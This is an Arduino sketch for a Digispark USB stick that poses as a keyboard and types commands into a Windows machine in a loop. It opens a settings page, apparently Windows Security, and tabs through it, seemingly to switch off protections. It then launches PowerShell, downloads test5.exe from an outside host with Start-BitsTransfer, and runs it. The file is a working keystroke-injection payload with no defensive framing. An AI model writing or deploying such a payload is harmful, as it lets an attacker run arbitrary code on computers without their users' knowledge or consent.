#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("Windows G");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("Start-BitsTransfer http://[host-ip]/uploads/test5.exe test5.exe");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("./test5.exe");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1100);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(1100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1100);
}
